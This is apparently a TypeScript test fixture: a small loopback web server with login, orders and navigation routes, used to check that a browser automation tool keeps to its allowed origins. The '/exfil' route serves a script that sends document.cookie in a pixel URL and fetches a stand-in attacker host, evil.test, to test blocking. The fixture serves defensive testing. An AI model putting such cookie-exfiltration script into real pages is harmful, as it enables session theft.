import { randomBytes } from 'node:crypto';
import http from 'node:http';
import { FIXTURE_ORIGIN, FIXTURE_PORT } from './registry/constants.js';

/*
 * A tiny application for the integration tests. It listens on a fixed loopback port because
 * the fixture adapter's allowed origin must be a static string. `http://localhost:<port>` is
 * the same server under an origin the adapter does NOT allow.
 */

export interface Hit {
  readonly host: string;
  readonly path: string;
  readonly method: string;
}

export interface FixtureApp {
  readonly origin: string;
  readonly hits: Hit[];
  readonly loginSuccesses: string[];
  /** Registers a session cookie value for an account. */
  addSession(token: string, account: string): void;
  close(): Promise<void>;
}

const USERS: Readonly<Record<string, string>> = { alice: 'alice-password', bob: 'bob-password' };
const ORDERS: Readonly<Record<string, { id: string; total: string; internal: string }[]>> = {
  alice: [
    { id: 'A-100', total: '10.00', internal: 'alice-internal-note' },
    { id: 'A-101', total: '11.50', internal: 'alice-internal-note' },
  ],
  bob: [{ id: 'B-200', total: '20.00', internal: 'bob-internal-note' }],
};

function page(body: string, head = ''): string {
  return `<!doctype html><html><head><meta charset="utf-8">${head}<title>fixture</title></head><body>${body}</body></html>`;
}

function cookieValue(header: string | undefined, name: string): string | undefined {
  for (const part of (header ?? '').split(';')) {
    const [key, ...rest] = part.trim().split('=');
    if (key === name) return rest.join('=');
  }
  return undefined;
}

export async function startFixtureApp(): Promise<FixtureApp> {
  const sessions = new Map<string, string>();
  const hits: Hit[] = [];
  const loginSuccesses: string[] = [];

  const server = http.createServer((request, response) => {
    const url = new URL(request.url ?? '/', FIXTURE_ORIGIN);
    hits.push({
      host: request.headers.host ?? '',
      path: url.pathname,
      method: request.method ?? '',
    });
    const account = sessions.get(cookieValue(request.headers.cookie, 'fx_session') ?? '');
    const html = (body: string, status = 200, head = ''): void => {
      response.writeHead(status, { 'content-type': 'text/html; charset=utf-8' });
      response.end(page(body, head));
    };
    const redirect = (location: string): void => {
      response.writeHead(302, { location });
      response.end();
    };

    switch (url.pathname) {
      case '/login':
        if (request.method === 'POST') {
          let body = '';
          request.on('data', (chunk: Buffer) => (body += chunk.toString()));
          request.on('end', () => {
            const form = new URLSearchParams(body);
            const user = form.get('username') ?? '';
            if (Object.hasOwn(USERS, user) && USERS[user] === form.get('password')) {
              const token = randomBytes(16).toString('hex');
              sessions.set(token, user);
              loginSuccesses.push(user);
              response.writeHead(302, {
                location: '/account',
                'set-cookie': `fx_session=${token}; Path=/; HttpOnly; SameSite=Lax`,
              });
              response.end();
            } else {
              html('<p id="error">wrong</p>', 401);
            }
          });
          return;
        }
        html(
          '<form method="post" action="/login"><input id="username" name="username" autofocus>' +
            '<input id="password" name="password" type="password"><button id="submit">Sign in</button></form>',
        );
        return;
      case '/account':
        if (account === undefined) return redirect('/login');
        return html(`<span id="account">${account}</span>`);
      case '/orders': {
        if (account === undefined) return redirect('/login');
        const rows = (ORDERS[account] ?? [])
          .map(
            (order) =>
              `<tr class="order"><td data-field="id">${order.id}</td><td data-field="total">${order.total}</td>` +
              `<td data-field="internal">${order.internal}</td></tr>`,
          )
          .join('');
        return html(`<span id="account">${account}</span><table>${rows}</table>`);
      }
      case '/missing':
        return html('<div data-testid="error-page" data-status="404">not here</div>', 404);
      case '/redirect-path':
        return redirect('/admin');
      case '/redirect-origin':
        return redirect(`http://localhost:${FIXTURE_PORT}/orders`);
      case '/go-login':
        return redirect('/login');
      case '/meta-refresh':
        return html('<p>refreshing</p>', 200, '<meta http-equiv="refresh" content="0;url=/admin">');
      case '/script-nav':
        return html("<script>setTimeout(() => { location.href = '/admin'; }, 50);</script>");
      case '/form':
        return html('<form method="post" action="/admin"><button id="go">go</button></form>');
      case '/exfil':
        return html(
          `<script>
            const img = new Promise((r) => { const i = new Image(); i.onload = r; i.onerror = r;
              i.src = 'http://localhost:${FIXTURE_PORT}/pixel?c=' + document.cookie; });
            const f = fetch('http://evil.test/collect').catch(() => null);
            Promise.all([img, f]).then(() => {
              document.body.insertAdjacentHTML('beforeend', '<div id="done">done</div>');
            });
          </script>`,
        );
      case '/big':
        return html(`<div id="big">${'x'.repeat(200_000)}</div>`);
      case '/admin':
        return html('<p>admin</p>');
      default:
        return html('<p>not found</p>', 404);
    }
  });

  await new Promise<void>((resolve, reject) => {
    server.once('error', reject);
    server.listen(FIXTURE_PORT, '127.0.0.1', () => resolve());
  });

  return {
    origin: FIXTURE_ORIGIN,
    hits,
    loginSuccesses,
    addSession: (token, account) => sessions.set(token, account),
    close: () =>
      new Promise((resolve) => {
        server.closeAllConnections();
        server.close(() => resolve());
      }),
  };
}

export function sessionStorageState(token: string): {
  cookies: {
    name: string;
    value: string;
    domain: string;
    path: string;
    expires: number;
    httpOnly: boolean;
    secure: boolean;
    sameSite: 'Strict' | 'Lax' | 'None';
  }[];
  origins: never[];
} {
  return {
    cookies: [
      {
        name: 'fx_session',
        value: token,
        domain: '127.0.0.1',
        path: '/',
        expires: -1,
        httpOnly: true,
        secure: false,
        sameSite: 'Lax',
      },
    ],
    origins: [],
  };
}
